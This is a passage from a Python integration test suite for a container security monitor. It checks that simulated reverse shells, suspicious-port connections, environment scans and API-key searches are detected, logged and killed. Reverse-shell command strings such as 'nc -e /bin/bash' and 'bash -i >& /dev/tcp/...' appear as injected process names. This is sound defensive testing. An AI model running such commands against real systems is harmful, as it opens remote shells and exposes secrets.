        cleanup_container(container_name, coi_binary)

    def test_suspicious_port_high_threat(self, test_workspace, enable_monitoring, coi_binary):
        """Test connection to suspicious ports (1234, 31337) triggers HIGH/CRITICAL threat."""
        port_script = Path(test_workspace) / "suspicious_port.py"
        port_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Connect to port 1234 (common reverse shell port, HIGH threat)
subprocess.Popen(
    ["timeout", "30", "nc", "-w", "2", "8.8.8.8", "1234"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

# Connect to port 31337 (elite/leet port, HIGH threat)
subprocess.Popen(
    ["timeout", "30", "nc", "-w", "2", "8.8.8.8", "31337"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        port_script.chmod(0o755)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "35",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-35"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Execute suspicious port connection script
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/suspicious_port.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Check for network threats - lenient check (network monitoring is best-effort)
        events = get_threat_events(container_name)
        network_threats = [e for e in events if e.get("category") == "network"]
        if len(network_threats) > 0:
            for threat in network_threats:
                assert threat.get("level") in ["high", "critical"], (
                    f"Expected HIGH/CRITICAL for suspicious port, got {threat.get('level')}"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_rfc1918_private_address_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test that connections to RFC1918 private addresses trigger a network threat."""
        rfc1918_script = Path(test_workspace) / "rfc1918.py"
        rfc1918_script.write_text(
            """#!/usr/bin/env python3
import subprocess
import time

# Attempt connections to RFC1918 private address ranges
# 10.0.0.0/8
subprocess.Popen(
    ["timeout", "5", "nc", "-w", "2", "10.0.0.1", "80"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
# 172.16.0.0/12
subprocess.Popen(
    ["timeout", "5", "nc", "-w", "2", "172.16.0.1", "80"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
# 192.168.0.0/16
subprocess.Popen(
    ["timeout", "5", "nc", "-w", "2", "192.168.1.1", "80"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(60)
"""
        )
        rfc1918_script.chmod(0o755)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                str(test_workspace),
                "--slot",
                "36",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = (
            get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + "-36"
        )

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Execute RFC1918 connection script
        subprocess.Popen(
            ["incus", "exec", container_name, "--", "python3", "/workspace/rfc1918.py"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(10)

        # Lenient check: if network threats are detected they must be HIGH or CRITICAL
        events = get_threat_events(container_name)
        network_threats = [e for e in events if e.get("category") == "network"]
        if len(network_threats) > 0:
            for threat in network_threats:
                assert threat.get("level") in ["high", "critical"], (
                    f"Expected HIGH/CRITICAL for RFC1918 address, got {threat.get('level')}"
                )

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestReverseShellPatterns:
    """Test detection of various reverse shell patterns."""

    def test_python_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test Python reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "10",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-10"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject Python reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'python -c socket.socket' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and kill
        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        assert killed, "Container should be killed on Python reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat for Python reverse shell"

        # Verify pattern mentioned in threat
        threats_text = " ".join([e.get("description", "") for e in critical])
        assert "python" in threats_text.lower(), "Expected 'python' in threat description"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_perl_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test Perl reverse shell pattern detection."""
        # Capture stderr for debugging
        stderr_file = Path("/tmp") / "coi-test-perl-debug.log"
        stderr_fd = open(stderr_file, "w")  # noqa: SIM115

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "11",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=stderr_fd,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-11"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            stderr_fd.close()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject Perl reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'perl -e use IO::Socket' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        # Close stderr and print debug log BEFORE assertions
        proc.terminate()
        stderr_fd.close()

        print("\n=== COI Perl Test Debug Log ===")
        if stderr_file.exists():
            print(stderr_file.read_text())
        print("=== End Debug Log ===\n")

        assert killed, "Container should be killed on Perl reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected CRITICAL threat for Perl reverse shell"

        cleanup_container(container_name, coi_binary)

    def test_php_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test PHP reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "12",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-12"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject PHP reverse shell pattern
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'php -r fsockopen' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        # DEBUG: Print state and events if not killed
        if not killed:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: PHP test - container not killed ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
                )
            print("=== END DEBUG ===\n")

        assert killed, "Container should be killed on PHP reverse shell detection"

        # Verify threat logged
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        if len(critical) == 0:
            print("\n=== DEBUG: No CRITICAL events found ===")
            print(f"All events: {events}")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat for PHP reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_ruby_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test Ruby reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "30",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-30"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject Ruby reverse shell pattern (uses -rsocket flag for socket library)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'ruby -rsocket -e socket' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        if not killed:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Ruby test - container not killed ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
                )
            print("=== END DEBUG ===\n")

        assert killed, "Container should be killed on Ruby reverse shell detection"

        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        if len(critical) == 0:
            print("\n=== DEBUG: No CRITICAL events found ===")
            print(f"All events: {events}")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat for Ruby reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_socat_reverse_shell_detection(self, test_workspace, enable_monitoring, coi_binary):
        """Test socat reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "31",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-31"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject socat reverse shell pattern (EXEC: variant used in shells)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'socat EXEC:bash' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        if not killed:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: socat test - container not killed ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
                )
            print("=== END DEBUG ===\n")

        assert killed, "Container should be killed on socat reverse shell detection"

        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        if len(critical) == 0:
            print("\n=== DEBUG: No CRITICAL events found ===")
            print(f"All events: {events}")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat for socat reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestMonitoringConfiguration:
    """Test monitoring configuration options."""

    def test_monitoring_disabled_no_detection(self, test_workspace, coi_binary):
        """Test that threats are NOT detected when monitoring is disabled."""
        # Create config with monitoring disabled
        # Include network mode = open to prevent network-related issues in CI
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        backup = config_path.read_text() if config_path.exists() else None

        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(
            """
[network]
mode = "open"

[monitoring]
enabled = false
"""
        )

        try:
            # Start shell WITHOUT --monitor flag (should respect config)
            proc = subprocess.Popen(
                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "13"],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(8)

            container_name = (
                get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-13"
            )

            if get_container_state(container_name) == "Unknown":
                proc.terminate()
                pytest.skip(f"Container {container_name} not found")

            # Inject malicious command (should NOT be detected)
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Wait to see if it would be detected
            time.sleep(10)

            # Container should still be running (no monitoring = no kill)
            state = get_container_state(container_name)
            assert state == "Running", (
                f"Container should stay running when monitoring disabled, got {state}"
            )

            # Verify NO threats logged (audit log shouldn't exist or be empty)
            events = get_threat_events(container_name)
            assert len(events) == 0, (
                f"Expected NO threats when monitoring disabled, found {len(events)}"
            )

            proc.terminate()
            cleanup_container(container_name, coi_binary)

        finally:
            # Restore original config
            if backup:
                config_path.write_text(backup)
            elif config_path.exists():
                config_path.unlink()

    def test_monitoring_enabled_via_config_only(self, test_workspace, coi_binary):
        """Test monitoring enabled via config file without --monitor flag."""
        # Create config with monitoring enabled - include network section for completeness
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        backup = config_path.read_text() if config_path.exists() else None

        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(
            """
[monitoring]
enabled = true
auto_pause_on_high = true
auto_kill_on_critical = true
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000

[network]
mode = "restricted"
"""
        )

        try:
            # Start shell WITHOUT --monitor flag (config should enable it)
            proc = subprocess.Popen(
                [coi_binary, "shell", "--workspace", test_workspace, "--slot", "19"],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(8)

            container_name = (
                get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-19"
            )

            if get_container_state(container_name) == "Unknown":
                proc.terminate()
                pytest.skip(f"Container {container_name} not found")

            # Wait for monitoring baseline to stabilize
            time.sleep(10)

            # Inject malicious command - should be detected via config-enabled monitoring
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # Wait for detection and kill
            time.sleep(5)

            killed = False
            for _ in range(15):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ["Stopped", "Frozen", "Unknown"]:
                    killed = True
                    break

            # DEBUG: Print state and events if not killed
            if not killed:
                events = get_threat_events(container_name)
                print("\n=== DEBUG: Config test - container not killed ===")
                print(f"Final state: {get_container_state(container_name)}")
                print(f"Total threat events: {len(events)}")
                if events:
                    for i, event in enumerate(events):
                        print(
                            f"Event {i}: level={event.get('level')}, "
                            f"desc={event.get('description')[:50] if event.get('description') else 'N/A'}"
                        )
                print("=== END DEBUG ===")

            assert killed, "Container should be killed when monitoring enabled via config"

            # Wait a moment for audit log to be flushed
            time.sleep(2)

            # Verify threat logged
            events = get_threat_events(container_name)
            critical = [e for e in events if e.get("level") == "critical"]

            # DEBUG: Print all events if no critical found
            if len(critical) == 0:
                print("\n=== DEBUG: No CRITICAL events found ===")
                print(f"Container was killed: {killed}")
                print(f"Total events: {len(events)}")
                for i, event in enumerate(events):
                    print(f"Event {i}: {event}")
                # Check if audit log exists
                log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
                print(f"Audit log exists: {log_path.exists()}")
                if log_path.exists():
                    print(f"Audit log size: {log_path.stat().st_size} bytes")
                print("=== END DEBUG ===\n")

            assert len(critical) > 0, "Expected CRITICAL threat when config enables monitoring"

            proc.terminate()
            cleanup_container(container_name, coi_binary)

        finally:
            # Restore original config
            if backup:
                config_path.write_text(backup)
            elif config_path.exists():
                config_path.unlink()

    def test_monitor_flag_overrides_config_auto_kill_disabled(self, test_workspace, coi_binary):
        """Test that --monitor flag forces auto_kill_on_critical=true even when config disables it."""
        config_path = Path.home() / ".config" / "coi" / "config.toml"
        backup = config_path.read_text() if config_path.exists() else None

        config_path.parent.mkdir(parents=True, exist_ok=True)
        config_path.write_text(
            """
[network]
mode = "open"

[monitoring]
enabled = true
auto_kill_on_critical = false
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
"""
        )

        try:
            # Start shell WITH --monitor flag: should force auto_kill regardless of config
            proc = subprocess.Popen(
                [
                    coi_binary,
                    "shell",
                    "--workspace",
                    test_workspace,
                    "--slot",
                    "32",
                    "--monitor",
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(8)

            container_name = (
                get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-32"
            )

            if get_container_state(container_name) == "Unknown":
                proc.terminate()
                pytest.skip(f"Container {container_name} not found")

            # Wait for monitoring baseline to stabilize
            time.sleep(10)

            # Inject critical reverse shell pattern
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    "exec -a 'nc -e /bin/bash 10.0.0.1 4444' sleep 30",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            time.sleep(5)

            # Container SHOULD be killed: --monitor flag forces auto_kill_on_critical=true
            killed = False
            final_state = "Unknown"
            for _ in range(15):
                time.sleep(1)
                state = get_container_state(container_name)
                if state in ["Stopped", "Frozen", "Unknown"]:
                    killed = True
                    final_state = state
                    break

            # Always print debug info for this test to help diagnose CI failures
            events = get_threat_events(container_name)
            print("\n=== DEBUG: --monitor override test ===")
            print(f"Container killed: {killed}, Final state: {final_state}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"action={event.get('action')}, title={event.get('title')}"
                )
            print("=== END DEBUG ===\n")

            # Note: "Unknown" state after injecting threat typically means the container
            # was successfully killed and cleaned up by monitoring. We already passed
            # the startup check, so we proceed with verification.

            assert killed, (
                "--monitor flag should force auto_kill_on_critical=true "
                "even when config has auto_kill_on_critical=false"
            )

            # The monitoring daemon writes to the audit log and kills the
            # container concurrently. On fast CI machines the log flush may
            # lag behind the kill by a few seconds, so retry before failing.
            critical = []
            for _ in range(15):  # Increased from 10 to 15 retries
                events = get_threat_events(container_name)
                critical = [e for e in events if e.get("level") == "critical"]
                if critical:
                    break
                time.sleep(1)

            # Print final event state for debugging
            if not critical:
                events = get_threat_events(container_name)
                print("\n=== DEBUG: No CRITICAL events found after retries ===")
                print(f"Total events: {len(events)}")
                for event in events:
                    print(f"- {event}")
                print("=== END DEBUG ===\n")

            assert len(critical) > 0, "Expected CRITICAL threat logged"

            proc.terminate()
            cleanup_container(container_name, coi_binary)

        finally:
            if backup:
                config_path.write_text(backup)
            elif config_path.exists():
                config_path.unlink()


class TestMultipleThreats:
    """Test handling of multiple simultaneous threats."""

    def test_multiple_simultaneous_threats(self, test_workspace, enable_monitoring, coi_binary):
        """Test that multiple threats are all detected and logged."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "20",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-20"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject multiple threats simultaneously
        # Threat 1: Reverse shell (CRITICAL)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Threat 2: Environment scanning (WARNING)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'printenv' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Threat 3: API key search (WARNING)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'grep -r API_KEY /workspace' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect all threats
        time.sleep(5)

        # Container should be killed (CRITICAL takes precedence)
        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        assert killed, "Container should be killed when CRITICAL threat present"

        # Verify all threats are logged
        events = get_threat_events(container_name)

        # Should have CRITICAL threat(s)
        critical = [e for e in events if e.get("level") == "critical"]
        assert len(critical) > 0, "Expected at least one CRITICAL threat"

        # May have WARNING threats too (depending on timing)
        # Don't assert on warnings count - they may or may not be detected before kill

        # Verify total events captured
        assert len(events) >= 1, "Expected at least one threat event"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestAuditLogValidation:
    """Test audit log format and structure validation."""

    def test_audit_log_jsonl_format(self, test_workspace, enable_monitoring, coi_binary):
        """Verify audit log is valid JSONL with all required fields."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "21",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-21"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Trigger a threat to generate audit log entry
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/sh 10.0.0.1 9999' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection
        time.sleep(10)

        # Read audit log file directly
        log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
        assert log_path.exists(), "Audit log file should exist"

        # Parse and validate JSONL format
        # Get ThreatEvent objects (not MonitorSnapshots)
        events = get_threat_events(container_name)
        assert len(events) > 0, "Audit log should contain at least one ThreatEvent"

        for i, event in enumerate(events):
            # Verify required fields for ThreatEvent
            required_fields = [
                "id",
                "timestamp",
                "level",
                "category",
                "title",
                "description",
                "action",
            ]
            for field in required_fields:
                assert field in event, f"Missing required field '{field}' in event {i + 1}"

            # Verify field types
            assert isinstance(event["id"], str), "id should be string"
            assert isinstance(event["timestamp"], str), "timestamp should be string"
            assert isinstance(event["level"], str), "level should be string"
            assert isinstance(event["category"], str), "category should be string"
            assert isinstance(event["title"], str), "title should be string"
            assert isinstance(event["description"], str), "description should be string"
            assert isinstance(event["action"], str), "action should be string"

            # Verify level is valid
            assert event["level"] in ["info", "warning", "high", "critical"], (
                f"Invalid threat level: {event['level']}"
            )

            # Verify action is valid
            assert event["action"] in ["logged", "alerted", "paused", "killed", "pending"], (
                f"Invalid action: {event['action']}"
            )

            # Verify evidence field exists and has content
            assert "evidence" in event, "Missing evidence field"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_audit_log_evidence_structure(self, test_workspace, enable_monitoring, coi_binary):
        """Verify evidence data structure in audit log."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "22",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-22"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Trigger environment scanning (easier to verify evidence structure)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'env' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Get events
        events = get_threat_events(container_name)
        warnings = [e for e in events if e.get("level") == "warning"]

        if len(warnings) == 0:
            # Detection might be timing-dependent, don't fail
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("No WARNING events detected (timing dependent)")

        # Verify evidence structure for process-based threats
        for event in warnings:
            evidence = event.get("evidence")
            assert evidence is not None, "Evidence should not be None"

            # For process threats, evidence should have these fields
            if event.get("category") == "environment":
                # Evidence should be a dict with process info
                assert isinstance(evidence, dict), "Evidence should be a dict for process threats"
                # Common fields: pid, command, user, pattern
                # Don't assert on specific fields as structure may vary

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestFalsePositives:
    """Test that legitimate commands don't trigger false alerts."""

    def test_legitimate_file_reads_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that small file reads don't trigger false alerts."""
        # Create a small file (well below 50MB threshold)
        small_file = Path(test_workspace) / "data.txt"
        small_file.write_text("Some data\n" * 1000)  # ~10KB

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "23",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-23"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize (prevents startup I/O from affecting test)
        time.sleep(15)

        # Verify container is still running before the test
        pre_state = get_container_state(container_name)
        if pre_state != "Running":
            proc.terminate()
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Container not running before file read ===")
            print(f"State: {pre_state}")
            print(f"Events: {events}")
            print("=== END DEBUG ===\n")
            cleanup_container(container_name, coi_binary)
            pytest.fail(f"Container stopped before file read test: {pre_state}")

        # Read the small file - should NOT trigger
        subprocess.run(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data.txt",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=10,
        )

        # Wait to see if it would be detected
        time.sleep(5)

        # Container should still be running (no false positive)
        state = get_container_state(container_name)
        if state != "Running":
            events = get_threat_events(container_name)
            print("\n=== DEBUG: Container stopped after file read ===")
            print(f"State: {state}")
            print(f"Events: {len(events)} total")
            for e in events:
                print(f"  - {e.get('level')}: {e.get('title')} ({e.get('category')})")
            print("=== END DEBUG ===\n")

        assert state == "Running", f"Container should stay running on small file read, got {state}"

        # Check audit log - should have no HIGH threats for file reads
        events = get_threat_events(container_name)
        high_fs_threats = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs_threats) == 0, "Small file read should not trigger HIGH threat"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_legitimate_nc_usage_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that nc without -e flag doesn't trigger false alert."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "24",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-24"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Use nc for legitimate port listening (no -e, no network connection)
        # Just check if nc exists, don't actually listen
        subprocess.Popen(
            [
                "incus",
                "exec",
